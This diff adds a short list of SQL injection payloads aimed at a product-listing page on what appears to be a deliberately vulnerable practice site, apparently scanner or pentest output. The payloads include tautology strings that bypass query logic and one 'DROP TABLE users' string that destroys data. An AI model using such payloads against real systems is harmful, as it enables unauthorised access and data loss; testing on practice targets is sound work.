@@ -1,0 +1,12 @@
+Vulnerable URL: http://testphp.vulnweb.com/listproducts.php
+Payload: ' OR '1'='1
+
+Vulnerable URL: http://testphp.vulnweb.com/listproducts.php
+Payload: ' OR 1=1 --
+
+Vulnerable URL: http://testphp.vulnweb.com/listproducts.php
+Payload: '; DROP TABLE users --
+
+Vulnerable URL: http://testphp.vulnweb.com/listproducts.php
+Payload: ' OR 'a'='a
+
